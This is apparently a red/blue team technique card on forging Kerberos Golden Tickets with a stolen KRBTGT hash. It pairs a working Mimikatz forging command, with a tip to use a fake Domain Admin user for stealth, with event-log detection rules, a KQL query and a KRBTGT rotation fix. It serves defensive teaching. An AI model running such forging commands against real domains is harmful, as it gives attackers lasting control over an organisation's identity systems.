# [CA-KERB-003]: Golden Ticket Creation (KRBTGT)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-003 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets: Golden Ticket (T1558.001)](https://attack.mitre.org/techniques/T1558/001/) |
| **Tactic** | Credential Access / Persistence |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Forging a Ticket Granting Ticket (TGT) using the NTLM hash of the `krbtgt` account. Because the KDC validates TGTs using this hash, an attacker with the hash can create valid TGTs for *any* user, with *any* group membership (Domain Admins), valid for *10 years*.
- **Attack Surface:** Kerberos Authentication mechanism.
- **Business Impact:** **Total Domain Dominance**. The attacker controls the identity layer of the network.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** KRBTGT Hash (obtained via DCSync or NTDS dump).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Impacket (ticketer.py)](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Forging the Ticket**
Create a TGT for a non-existent user (to be stealthy) but with Domain Admin group IDs (512, 519).
```powershell
# Mimikatz
kerberos::golden /user:FakeAdmin /domain:target.local /sid:S-1-5-21-XXX /krbtgt:HASH /id:500 /groups:512,513,518,519,520 /ptt
```

**Step 2: Verification**
```cmd
klist
dir \\DC01\C$
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4624 | Logon with weird Domain Name or non-existent user. |
| **Security** | 4769 | TGS Request where the TGT used has a lifetime > Domain Policy (Default 10h). |

#### 5.2 Sentinel (KQL)
```kusto
// Detect TGTs valid for more than 10 hours (Golden Tickets are often 10 years)
SecurityEvent
| where EventID == 4769
| extend TicketLifetime = EndTime - StartTime
| where TicketLifetime > 10h
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **KRBTGT Rotation:** Reset the KRBTGT password **TWICE** (to invalidate history). This immediately invalidates all existing Golden Tickets.
    `Reset-KrbTgtPassword.ps1` (Microsoft Script)

## 7. ATTACK CHAIN
> **Preceding Technique:** [CA-DUMP-002] (DCSync)
> **Next Logical Step:** [LAT-AD-003] (Persistence)
